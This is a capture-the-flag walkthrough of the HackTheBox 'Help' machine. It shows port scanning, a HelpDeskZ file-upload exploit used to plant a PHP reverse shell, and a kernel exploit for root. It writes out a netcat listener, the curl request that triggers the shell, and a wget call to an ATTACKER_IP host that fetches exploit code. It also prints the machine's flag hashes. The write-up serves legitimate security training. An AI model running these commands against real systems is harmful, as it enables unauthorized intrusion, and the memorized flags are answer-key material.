# Help HTB - Walkthrough
## Overview

This documentation provides a comprehensive walkthrough of the penetration testing process for the Help machine from HackTheBox. The box involves web application exploitation, privilege escalation, and kernel vulnerability exploitation.

## Reconnaissance

### Initial Scanning

```bash
export target=10.129.230.159
echo "Target IP set to: $target"

# Comprehensive port scan
sudo nmap -p- --min-rate 5000 -sT -vvv $target

# Service and version detection
sudo nmap -sC -sV -p 22,80,3000 -T4 $target
```

<img width="480" height="270" alt="image" src="https://github.com/user-attachments/assets/a4615960-923b-41d7-b682-320d75d93cd8" />

<img width="713" height="257" alt="image" src="https://github.com/user-attachments/assets/9abc13d5-64df-42e7-9647-b1d5bd603093" />

<img width="811" height="401" alt="image" src="https://github.com/user-attachments/assets/a1f454ce-c6c7-44f5-a9ba-40b69d1cef14" />


**Discovered Services:**
- **Port 22**: SSH
- **Port 80**: HTTP (Apache)
- **Port 3000**: Node.js

### Web Application Enumeration

<img width="953" height="616" alt="image" src="https://github.com/user-attachments/assets/bc899ce3-5c64-4f0a-a078-762b6c6fb054" />


```bash
# Add domain to hosts file
echo "$target help.htb" | sudo tee -a /etc/hosts
```
<img width="525" height="309" alt="image" src="https://github.com/user-attachments/assets/f923eee1-b1e6-4599-a68c-06f234e0cc6e" />

### Directory bruteforcing

<img width="779" height="552" alt="image" src="https://github.com/user-attachments/assets/652701e9-e26f-43a9-b7c0-bf3fd05d4e1e" />

<img width="778" height="475" alt="image" src="https://github.com/user-attachments/assets/b7c950c0-6fda-4850-a516-c70ab4259f16" />

<img width="957" height="670" alt="image" src="https://github.com/user-attachments/assets/f4784b93-44a3-46df-adaa-f660f0c377ad" />

**Key Discovery:** `/support` directory hosting HelpDeskZ application.

## Vulnerability Analysis

### HelpDeskZ Version Identification

The HelpDeskZ version was identified by accessing:
```
http://help.htb/support/readme.html
```

### Searchsploit Research

```bash
searchsploit helpdeskz
```

<img width="867" height="464" alt="image" src="https://github.com/user-attachments/assets/78ecbb67-cb20-47e6-b107-1351e2dfe9f5" />

**Identified Exploit:** HelpDeskZ 1.0.2 - Arbitrary File Upload (ExploitDB ID: 40300)

<img width="957" height="222" alt="image" src="https://github.com/user-attachments/assets/29176c88-623a-4232-b26a-60124dcb2414" />

## Exploitation

### File Upload Vulnerability

1. **Download the exploit:**
```bash
searchsploit -m 40300
```

<img width="543" height="311" alt="image" src="https://github.com/user-attachments/assets/cb68c9a9-d7cf-4a4c-b432-10a3585ef238" />

2. **Upload PHP reverse shell through the ticket submission form:**
```
http://help.htb/support/?v=submit_ticket&action=displayForm
```

<img width="1319" height="978" alt="image" src="https://github.com/user-attachments/assets/006c7997-a4ac-413d-bd66-81f0beeeaaf1" />

<img width="1364" height="441" alt="image" src="https://github.com/user-attachments/assets/99d48310-5f7a-4d8a-964a-d4fa47cd83a1" />

3. **Execute the uploaded shell:**
```bash
# Generate shell URL using the exploit
python2 40300.py http://help.htb/support/uploads/tickets/ shell.php

# Set up listener
nc -nlvp 9001

# Trigger the shell
curl http://help.htb/support/uploads/tickets/[GENERATED_HASH].php
```

<img width="683" height="104" alt="image" src="https://github.com/user-attachments/assets/994be117-e18e-4656-9d06-86afef92c904" />

<img width="960" height="726" alt="image" src="https://github.com/user-attachments/assets/b87fbbd8-a859-446c-a2bf-d024fad28507" />

### Initial Access

Successfully obtained a shell as user `help`:
```bash
whoami
# help

cat /home/help/user.txt
# c4a45fefa1e4dcd8ddcca8777ab9ffde
```

<img width="323" height="82" alt="image" src="https://github.com/user-attachments/assets/7cd44cf4-1639-4873-a315-dba3ff0bc967" />

## Privilege Escalation

### System Information Gathering

```bash
uname -a
# Linux help 4.4.0-116-generic #140-Ubuntu SMP Mon Feb 12 21:23:04 UTC 2018 x86_64 x86_64 x86_64 GNU/Linux
```
<img width="873" height="83" alt="image" src="https://github.com/user-attachments/assets/b80feabf-0628-4948-876a-58c230a6c7f5" />


### Kernel Exploitation

**Vulnerability:** Linux Kernel 4.4.0-116 Generic Privilege Escalation

<img width="563" height="198" alt="image" src="https://github.com/user-attachments/assets/13779a48-56f9-48eb-9159-bfe6036e458f" />


1. **Download and compile the exploit:**

```bash
# On attacker machine
python3 -m http.server

# On target machine
wget http://ATTACKER_IP:8000/44298.c -O exploit.c
gcc -o exploit exploit.c
```

<img width="643" height="219" alt="image" src="https://github.com/user-attachments/assets/63b7c225-9238-473d-8054-fafcb4775f67" />


2. **Execute the exploit:**
```bash
./exploit
```

### Root Access

Successfully elevated to root privileges:
```bash
whoami
# root

cat /root/root.txt
# 8df818bc2013e9b03c18234fdd0449b6
```

<img width="960" height="459" alt="image" src="https://github.com/user-attachments/assets/37fa0f48-8da5-4d92-b70a-f59a204378c6" />

<img width="609" height="190" alt="image" src="https://github.com/user-attachments/assets/5792a17f-e3f7-4929-9f2c-fe1e1a9d6a98" />

## Technical Details

### Vulnerabilities Exploited

1. **HelpDeskZ Arbitrary File Upload (CVE-2015-0937)**
   - Impact: Remote Code Execution
   - Vector: Unrestricted file upload in ticket attachments

2. **Linux Kernel Privilege Escalation**
   - CVE: Multiple vulnerabilities in Linux Kernel 4.4.0-116
   - Impact: Local Privilege Escalation to root

### Key Learning Points

- Web application directory enumeration
- HelpDeskZ vulnerability research and exploitation
- File upload restriction bypass techniques
- Kernel version identification and exploitation
- Privilege escalation methodology

## Mitigation Recommendations

1. **HelpDeskZ:**
   - Update to latest version
   - Implement proper file upload validation
   - Restrict executable file types

2. **System Hardening:**
   - Regular kernel updates and patches
   - Principle of least privilege for service accounts
   - Web application firewall implementation

## Tools Used

- **Nmap** - Network scanning
- **Dirb** - Directory enumeration
- **Searchsploit** - Vulnerability research
- **Netcat** - Reverse shell handling
- **GCC** - Exploit compilation

---

*This walkthrough is for educational purposes only. Always ensure you have proper authorization before conducting penetration testing activities.*
